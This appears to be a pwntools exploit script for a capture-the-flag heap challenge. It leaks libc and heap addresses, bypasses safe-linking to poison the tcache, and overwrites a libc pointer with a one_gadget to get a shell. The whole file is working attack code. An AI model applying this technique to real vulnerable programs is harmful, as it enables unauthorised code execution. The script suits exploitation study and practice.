#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched", checksec = False)
libc = ELF("./libc.so.6")
context.binary = exe

sa = lambda a, b: p.sendafter(a, b)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(index, size, data):
	sla(b"Exit\n", b"1")
	sla(b"index?\n", f"{index}".encode())
	sla(b"make it?\n", f"{size}".encode())
	sa(b"store here?\n", data)

def display(index):
	sla(b"Exit\n", b"2")
	sla(b"index?\n", f"{index}".encode())

def edit(index, data):
	sla(b"Exit\n", b"3")
	sla(b"index?\n", f"{index}".encode())
	sa(b"store here?\n", data)

def delete(index):
	sla(b"Exit\n", b"4")
	sla(b"index?\n", f"{index}".encode())

script = '''
brva 0x1571
'''

p = process("./chall_patched")

for i in range(9):
	create(i, 0x88, f"{i}".encode() * 0x88)

for i in range(9):
	delete(i)

create(9, 0x88, b"9" * 0x88)
delete(8)

display(7)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1edcc0
lleak("libc base", libc_base)

display(0)
heap_base = u64(p.recv(5).ljust(8, b"\x00")) << 12
lleak("heap base", heap_base)

target = (libc_base + 0x1ed090 - 0x10) ^ ((heap_base + 0x720) >> 12)
create(10, 0x128, b"A" * 0x88 + p64(0x90) + p64(target))

#debug()

one_gadget = libc_base + 0xd7910
create(11, 0x88, b"B" * 0x88)
create(12, 0x88, b"C" * 0x18 + p64(one_gadget))

p.sendline(b"ls")

p.interactive()